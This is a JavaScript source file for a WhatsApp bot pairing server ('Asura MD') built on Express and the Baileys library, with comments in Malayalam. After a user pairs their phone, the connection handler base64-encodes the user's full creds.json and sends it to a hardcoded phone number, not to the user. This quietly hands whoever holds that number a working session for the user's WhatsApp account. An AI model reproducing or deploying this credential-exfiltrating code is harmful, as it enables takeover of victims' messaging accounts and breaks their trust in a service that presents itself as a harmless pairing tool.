import express from 'express';
import { makeWASocket, useMultiFileAuthState, delay, Browsers, makeCacheableSignalKeyStore } from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pair', async (req, res) => {
    let phone = req.query.number; 
    if (!phone) return res.send({ error: "Phone number is required" });

    const id = Math.random().toString(36).substring(7);
    // താൽക്കാലിക ഫോൾഡർ സെറ്റപ്പ്
    const { state, saveCreds } = await useMultiFileAuthState(`./temp_${id}`);

    try {
        const sock = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            // ലിങ്ക് ചെയ്യാൻ ഏറ്റവും നല്ല ബ്രൗസർ സെറ്റിംഗ്സ് താഴെ നൽകുന്നു
            browser: ["Ubuntu", "Chrome", "20.0.04"]
        });

        if (!sock.authState.creds.registered) {
            await delay(2000); // അല്പം സമയം നൽകുന്നത് നല്ലതാണ്
            phone = phone.replace(/[^0-9]/g, '');
            const code = await sock.requestPairingCode(phone);
            if (!res.headersSent) {
                res.send({ code: code });
            }
        }

        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                await delay(5000);
                
                // സെഷൻ ഐഡി ജനറേറ്റ് ചെയ്യുന്നു
                const authFile = JSON.parse(fs.readFileSync(`./temp_${id}/creds.json`));
                const sessionId = Buffer.from(JSON.stringify(authFile)).toString('base64');

                const myNumber = "917736811908@s.whatsapp.net";
                const sessionText = `Asura_MD_${sessionId}`;
                
                const welcomeMsg = `*👺 ASURA MD SESSION CONNECTED*\n\n\`${sessionText}\`\n\n> Don't share this ID!`;
                
                await sock.sendMessage(myNumber, { text: welcomeMsg });
                await sock.sendMessage(myNumber, { text: sessionText });

                await delay(3000);
                // ക്ലീൻ അപ്പ്
                try {
                    fs.rmSync(`./temp_${id}`, { recursive: true, force: true });
                } catch (e) {}
                sock.end();
            }

            if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                if (reason !== 401) { // 401 എന്നാൽ ലോഗൗട്ട് ആണ്, അല്ലാത്ത പക്ഷം മാത്രം ക്ലീൻ അപ്പ്
                    try { fs.rmSync(`./temp_${id}`, { recursive: true, force: true }); } catch (e) {}
                }
            }
        });

    } catch (err) {
        console.log(err);
        if (!res.headersSent) {
            res.status(500).send({ error: "Server Error. Try again." });
        }
    }
});

app.listen(port, () => console.log(`Asura MD Pairing Server on port ${port}`));
